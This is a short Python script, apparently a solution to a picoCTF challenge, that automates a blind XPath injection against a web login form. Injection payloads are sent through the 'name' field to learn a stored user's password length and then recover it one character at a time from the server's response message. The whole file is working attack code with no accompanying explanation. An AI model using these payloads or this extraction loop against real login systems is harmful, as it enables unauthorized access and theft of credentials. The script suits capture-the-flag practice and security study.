# -*- coding:utf-8 -*-
"""
    @Time  : 2022/12/12  15:17
    @Author: Feng Lepeng
    @File  : t6.py
    @Desc  :
"""

import string
import requests
from tqdm import tqdm

flag = ""
password_length = 0
alphabet = string.ascii_letters + "0123456789" + "{}_()"
for i in tqdm(range(64), desc="Determing Flag Length"):
    r = requests.post(
        "http://mercury.picoctf.net:20297",
        data={
            "name": "' or string-length(//user[position()=3]/pass)="
            + str(i)
            + " or ''='",
            "pass": "",
        },
    )
    if "You&#39;re on the right path." in r.text:
        password_length = i
        break

print("Password/Flag Length: " + str(password_length))

loop_tqdm = tqdm(range(1, password_length + 1), desc="Finding Flag")
for i in loop_tqdm:
    for letter in alphabet:
        r = requests.post(
            "http://mercury.picoctf.net:20297",
            data={
                "name": "' or substring(//user[position()=3]/pass,"
                + str(i)
                + ',1)="'
                + letter
                + "\" or ''='",
                "pass": "",
            },
        )
        if "You&#39;re on the right path." in r.text:
            flag += letter
            loop_tqdm.write("Current Flag: %s" % flag)
            break

print("Password/Flag: " + flag)